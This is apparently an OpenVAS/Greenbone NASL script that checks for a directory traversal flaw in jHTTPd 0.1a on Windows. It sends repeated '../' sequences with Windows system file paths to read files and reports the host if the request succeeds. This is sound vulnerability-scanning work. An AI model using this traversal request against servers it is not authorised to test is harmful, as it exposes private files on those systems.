if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902404" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-04-01 15:39:52 +0200 (Fri, 01 Apr 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "jHTTPd Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17068/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 8082 );
	script_mandatory_keys( "jHTTPd/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "jHTTPd version 0.1a on windows." );
	script_tag( name: "insight", value: "The flaws are due to an error in validating backslashes in
  the filenames." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running jHTTPd and is prone to directory traversal
  vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
jhPort = http_get_port( default: 8082 );
banner = http_get_remote_headers( port: jhPort );
if(!banner || !ContainsString( banner, "Server: jHTTPd" )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	data = crap( data: "../", length: 16 );
	exp = data + "/" + files[file];
	if(http_vuln_check( port: jhPort, url: exp, pattern: file, check_header: TRUE )){
		report = http_report_vuln_url( port: jhPort, url: exp );
		security_message( port: jhPort, data: report );
		exit( 0 );
	}
}
exit( 99 );

